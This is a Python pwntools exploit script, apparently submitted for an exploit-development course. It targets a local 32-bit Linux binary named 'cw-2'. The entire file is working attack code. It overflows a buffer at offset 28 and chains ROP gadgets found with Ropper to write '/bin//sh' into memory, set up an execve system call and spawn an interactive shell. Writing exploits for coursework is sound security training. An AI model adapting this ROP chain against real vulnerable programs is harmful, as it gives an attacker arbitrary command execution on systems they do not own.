#!/bin/python3
from pwn import *
from struct import pack
from struct import *

context(arch='i386', os='linux') # the executable is of 32 bit linux system

cw = process('./cw-2') # the actual executable file.

# the offset of the executable file while testing was found to be 28.
offset = 28

# Since we get the writeable memory areas as 0x080e5000 to 0x080e7000 so we need some address of it for exploit
writeable_address = 0x080e6425
writeable_address_4 = 0x080e6429  # adding +4 bytes
writeable_address_8 = 0x080e642d  # another +4 bytes

# Various Gadgets addresses found through Ropper
pop_eax = 0x080b074a
pop_ebx = 0x08049022
pop_ecx = 0x08049e39
pop_edx = 0x080583c9

inc_eax = 0x0808055e
xor_eax = 0x0804fb90
mov_edx = 0x08059102

int_0x80 = 0x0804a3d2

padding = 0x41414141   # Applying the padding as `AAAA` which was also used during the testing of the exploit.

# Adding the `/bin/sh` as the payload so it spawn the shell while execution.
add_bin = b""
add_bin += pack('<I', pop_edx)              # Loading the writeable address for /bin
add_bin += pack('<I', writeable_address)    # The Writeable address to add /bin
add_bin += pack('<I', padding)              # Padding for the alignment
add_bin += pack('<I', pop_eax)              # Load `/bin` in EAX register
add_bin += b'/bin'                          # The actual value
add_bin += pack('<I', mov_edx)              # Writing `/bin` into EDX

add_sh = b""
add_sh += pack('<I', pop_edx)               # Loading the writeable address for //sh
add_sh += pack('<I', writeable_address_4)   # The writeable address to add //sh
add_sh += pack('<I', padding)               # Padding for the alignment
add_sh += pack('<I', pop_eax)               # Load `//sh` in EAX
add_sh += b'//sh'                           # The acutal value with extra / for alignment
add_sh += pack('<I', mov_edx)               # Writing `//sh` into EDX

null_byte = b""
null_byte += pack('<I', pop_edx)            # Loading the writeable address for null termination
null_byte += pack('<I', writeable_address_8)# The Writeable address to add null terminator
null_byte += pack('<I', padding)            # Padding for the alignment
null_byte += pack('<I', xor_eax)            # Making the EAX value zero with the xor
null_byte += pack('<I', mov_edx)            # Writing the null terminator to EDX

# Setting up the execve systemcall with arguments set for the making of the systemcall possible
sys_arg = b""
sys_arg += pack('<I', pop_ebx)              # Setting EBX for `/bin//sh`
sys_arg += pack('<I', writeable_address)    # Address where `/bin//sh` is
sys_arg += pack('<I', pop_ecx)              # Setting ECX for null terminator as Null value pass
sys_arg += pack('<I', writeable_address_8)  # Address of null terminator
sys_arg += pack('<I', pop_edx)              # Setting EDX for null terminator as Null value pass
sys_arg += pack('<I', writeable_address_8)  # Address of null terminator
sys_arg += pack('<I', writeable_address)    # this add is just to be sure.

# Setting up the EAX to 0x0b (11) which is for the execve systemcall
sys_call = b""
sys_call += pack('<I', xor_eax)             # Setting EAX value zero initally so it has no room for error

for _ in range(11):
    sys_call += pack('<I', inc_eax)         # Increasing the value of EAX 11 times to make it 0x0b for execve systemcall

interrupt = pack('<I', int_0x80)            # Calling interrupt to make the systemcall from the Kernel of the system.

rop = add_bin + add_sh + null_byte + sys_arg + sys_call + interrupt # the actual rop chain

payload = b"A" * offset + rop  # the payload for the exploit.

print(payload)
write('payload.txt', payload)

cw.send(payload)
cw.interactive()

cw.close()  # Closing the process after the shell is spawned so no process will be visisble.

# Payload Developed for Exploit Development Coursework 2 by Rohan Thapa.
# the zip does contain the linux executable as the password for it is `infected`